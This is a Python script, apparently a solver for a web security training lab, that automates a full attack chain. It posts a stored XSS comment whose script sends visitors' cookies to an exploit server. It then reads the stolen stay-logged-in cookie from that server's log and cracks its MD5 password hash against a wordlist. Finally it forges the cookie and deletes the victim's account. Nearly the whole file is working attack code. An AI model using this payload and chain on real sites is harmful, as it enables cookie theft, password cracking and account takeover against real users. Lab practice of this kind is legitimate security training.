"""
  Lab: Offline password cracking

  Steps:
  1. Send an Stored XSS in the comment section with f"<script>fetch('{exploit-server}/exploit?cookie=' + document.cookie)</script/> Exploited!)"
  2. Get cookies from logs server
  3. Decode cookie to get username and password
  4. Access '/my-account' and delete the user account

  Author: N00BCYB0T
"""
import argparse
import re
import base64
from hashlib import md5
from colorama import Fore

import requests
import requests.cookies
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

EXPLOIT_SERVER = "https://exploit-0a66007004d42bfd804370db01b20076.exploit-server.net/"



def main():
  parser = argparse.ArgumentParser()
  parser.add_argument('-u', '--url', required=True, help="Target URL, e.g. 'https://example.com/'")
  parser.add_argument('--proxy', help="Web Proxy, e.g. 'http://127.0.0.1:8080'")
  args = parser.parse_args()

  print(f"{Fore.BLUE}Starting...{Fore.RESET}")
  session = requests.Session()
  if args.proxy:
    proxies = {
      "http": args.proxy,
      "https": args.proxy
    }
    session.proxies = proxies
  session.verify = False
  url = args.url.strip('/')

  stored_check = stored_xss_post(session, url, '/post/comment')

  if stored_check:
    user, password = crack_user_and_pass()
    ok = delete_account(session, url, user, password)
    if ok:
      print(f"{Fore.GREEN} [+] Lab solved!{Fore.RESET}")
      exit(1)
    print(f"User {user} not {Fore.RED}deleted{Fore.RESET}!")
    exit(1)
  
def stored_xss_post(session, url, path):
  print(f"{Fore.YELLOW}STEP 1. {Fore.RESET}Sending Stored XSS in {Fore.RESET}{url}{path}{Fore.YELLOW}")

  data = {
     "postId": 8,
     "comment": f"<script>fetch('{EXPLOIT_SERVER}/exploit?cookie=' + document.cookie)</script/> Exploited!)",
     "name": "any",
     "email": "any@anything.com",
     "website": ""
  }
  try:
    response = session.post(f"{url}/{path}", data=data, allow_redirects=False)
    if response.status_code == 302:
        print(f"{Fore.GREEN}[+] Success :{Fore.RESET} Stored XSS successfully aplied!")
        return response
    else:
        print(f"{Fore.RED}Warning{Fore.RESET}: Unexpected status code {response.status_code}")
        return None
  except requests.RequestException as e:
    print(f"{Fore.RED}Error{Fore.RESET}: Request failed: {e}")
    return None

def crack_user_and_pass():
  try:
    logs = requests.get(f"{EXPLOIT_SERVER}/log")
  except requests.RequestException as e:
    print(f"{Fore.RED}Error{Fore.RESET}: Request failed: {e}")
    return None
  cookie_encoded = re.findall("stay-logged-in=(.*) HTTP", logs.text)
    
  if len(cookie_encoded) != 0:
    decoded_cookie = base64.b64decode(cookie_encoded[0]).decode()
    user = decoded_cookie.split(':')[0]
    hashed_password = decoded_cookie.split(':')[1]
    password = crack_md5(hashed_password)
    return user, password
  else:
    print(Fore.RED + "⦗!⦘ No cookies are found is the logs")
    exit(1)

def crack_md5(hash_to_crack):
    with open('../passwords.txt', 'r') as file:
        for word in file:
            word = word.strip()
            hashed_word = md5(word.encode()).hexdigest()
            if hashed_word == hash_to_crack:
                print(f"{Fore.GREEN}[+] Password cracked:{Fore.RESET} {word}")
                return word
    return None

def delete_account(session, url, user, password):
  stay_logged_in = base64.b64encode(
    f"{user}:{md5(password.encode()).hexdigest()}".encode()
  ).decode()
  print(f"{Fore.YELLOW}Crafted cookie:{Fore.RESET} {stay_logged_in}")
  session.cookies.set("stay-logged-in", stay_logged_in)
  response = session.post(f"{url}/my-account/delete", data={"password": password})

  if response.status_code == 302:
    return True
  
if __name__ == "__main__":
   main()